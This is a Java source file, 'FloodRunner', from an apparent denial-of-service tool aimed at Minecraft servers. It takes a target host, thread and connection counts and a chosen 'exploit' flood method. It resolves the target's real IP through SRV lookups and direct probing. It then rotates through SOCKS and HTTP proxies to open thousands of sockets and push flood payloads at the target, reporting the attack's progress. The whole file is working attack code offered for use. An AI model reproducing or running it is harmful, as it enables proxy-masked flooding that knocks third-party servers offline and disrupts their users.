package me.michaeldevc.flood;


import me.michaeldevc.helper.SRVResolver;
import me.michaeldevc.network.SocketHttp;
import me.michaeldevc.option.Options;
import me.michaeldevc.proxy.Proxies;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class FloodRunner {
    private final Options options;

    private final Proxies proxies;

    private int connections;

    private int failed;

    private int timed;

    private int maxConnections;

    private final Flooders flooders;

    public FloodRunner(Options options, Proxies proxies) {
        this.connections = 0;
        this.failed = 0;
        this.timed = 0;
        this.maxConnections = -1;
        this.flooders = new Flooders();
        this.options = options;
        this.proxies = proxies;
    }

    public void run() {
        String host = (String)this.options.getOption("host", "127.0.0.1");
        int port = ((Integer)this.options.getOption("port", Integer.valueOf(25565))).intValue();
        boolean srvResolve = ((Boolean)this.options.getOption("srvResolve", Boolean.valueOf(true))).booleanValue();
        boolean alwaysResolve = ((Boolean)this.options.getOption("alwaysResolve", Boolean.valueOf(false))).booleanValue();
        int threads = ((Integer)this.options.getOption("threads", Integer.valueOf(1000))).intValue();
        int connections = ((Integer)this.options.getOption("connections", Integer.valueOf(1000))).intValue();
        int attackTime = ((Integer)this.options.getOption("attackTime", Integer.valueOf(30))).intValue();
        boolean srvResolve2 = ((Boolean)this.options.getOption("srvResolve2", Boolean.valueOf(false))).booleanValue();
        int timeout = ((Integer)this.options.getOption("timeout", Integer.valueOf(0))).intValue();
        boolean keepAlive = ((Boolean)this.options.getOption("keepAlive", Boolean.valueOf(true))).booleanValue();
        String floodName = String.valueOf(this.options.getOption("exploit", "1"));
        boolean removeFailure = ((Boolean)this.options.getOption("removeFailure", Boolean.valueOf(false))).booleanValue();
        Flooders.LOOP_AMOUNT = ((Integer)this.options.getOption("loopAmount", Integer.valueOf(1500))).intValue();
        boolean print = ((Boolean)this.options.getOption("print", Boolean.valueOf(false))).booleanValue();
        boolean socksV4 = ((Boolean)this.options.getOption("socksV4", Boolean.valueOf(true))).booleanValue();
        if (srvResolve && alwaysResolve)
            System.out.println(
                    "ServerResolver and AlwaysResolve options are enabled at the same time, are you sure it's fine?");
        if (srvResolve) {
            String resolvedIp = SRVResolver.srv(host);
            String[] resolvedSplit = resolvedIp.split(":");
            host = resolvedSplit[0];
            port = Integer.parseInt(resolvedSplit[1]);
        }
        Flooders.Flooder flooder = this.flooders.findById(String.valueOf(floodName));
        if (flooder == null) {
            System.out.println(
                    "Flooder with name " + floodName + " doesnt exist! List of floods: " + this.flooders
                            .getFlooders().toString());
            System.exit(1);
            return;
        }
        if (srvResolve2)
            try {
                String latest = "unkown";
                byte b;
                int i;
                InetAddress[] arrayOfInetAddress;
                for (i = (arrayOfInetAddress = InetAddress.getAllByName(host)).length, b = 0; b < i; ) {
                    InetAddress resolved = arrayOfInetAddress[b];
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(latest = resolved.getHostAddress(), port), 1000);
                        socket.getOutputStream().write(0);
                    } catch (Exception ex) {
                        System.out.println("[SrvResolve2] Found ip, " + resolved.getHostAddress() +
                                ", but couldn't connect = (");
                    }
                    System.out.println("[SrvResolve2] Found ip! " + resolved.getHostAddress());
                    b++;
                }
                System.out.println("[SrvResolve2] Resolved ip! Using: " + (host = latest));
            } catch (Exception ex) {
                System.out.println("[SrvResolve2] Couldn't resolve ip! " + ex.getMessage());
            }
        (new Timer()).scheduleAtFixedRate(new TimerTask() {
            public void run() {
                System.out.println(
                        "Successfully connected sockets: \033[32m" +
                                FloodRunner.this.connections + "\033[0m" + "/" + FloodRunner.this.maxConnections +
                                "\nFailed: " + FloodRunner.this.failed + ", timed: " + "\033[31m" +
                                FloodRunner.this.timed + "\033[0m" + ", proxies: " + FloodRunner.this.proxies.size());
            }
        },  8000L, 8000L);
        (new Thread(() -> {
            try {
                Thread.sleep(1000L * threads);
            } catch (Exception exception) {}
            System.out.println("Attack finished.");
            System.exit(-1);
        })).start();
        ExecutorService executorService = Executors.newFixedThreadPool(threads);
        System.out.println("Started attack! " + host + ":" + port + ", method: " +
                "\033[34m" + floodName + "\033[0m" + "," +
                " threads: " + threads + ", time attack: " + attackTime);
        this.maxConnections = threads * connections;
        String finalServerName = host;
        int finalPort = port;
        for (int j = 0; j < threads; j++) {
            executorService.submit(() -> {
                try {
                    String newServerName;
                    int newServerPort;
                    if (srvResolve) {
                        String resolvedIp = SRVResolver.srv(finalServerName);
                        String[] resolvedSplit = resolvedIp.split(":");
                        newServerName = resolvedSplit[0];
                        newServerPort = Integer.parseInt(resolvedSplit[1]);
                    } else {
                        newServerName = finalServerName;
                        newServerPort = finalPort;
                    }
                    Proxy lastProxy = null;
                    for (int i = 0; i < threads; i++) {
                        try {
                            Proxy proxy = lastProxy = this.proxies.nextProxy();
                            Socket socket = (proxy.type() == Proxy.Type.HTTP) ? (Socket)new SocketHttp(newServerName, newServerPort, proxy.address(), connections) : new Socket(proxy);
                            if (!(socket instanceof SocketHttp)) {
                                if (alwaysResolve)
                                    try {
                                        Method m = socket.getClass().getDeclaredMethod("getImpl", new Class[0]);
                                        m.setAccessible(true);
                                        Object sd = m.invoke(socket, new Object[0]);
                                        m = sd.getClass().getDeclaredMethod("setV4", new Class[0]);
                                        m.setAccessible(true);
                                        m.invoke(sd, new Object[0]);
                                    } catch (Exception exception) {}
                                socket.connect(new InetSocketAddress(newServerName, newServerPort), connections);
                            }
                            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                            flooder.flood(out, newServerName, newServerPort);
                            out.flush();
                            this.connections++;
                            if (srvResolve2)
                                System.out.println("CONNECTED \033[31m" + newServerName + ":" + newServerPort + "\033[0m" + " | " + "\033[36m" + proxy.address().toString() + "\033[0m" + " x" + this.connections);
                            if (!keepAlive)
                                socket.close();
                        } catch (Exception ex) {
                            this.failed++;
                            if (ex.getMessage().contains("reply")) {
                                this.timed++;
                                if (removeFailure)
                                    this.proxies.removeProxy(lastProxy);
                            }
                        }
                    }
                } catch (Exception exception) {}
            });
        }
    }
}
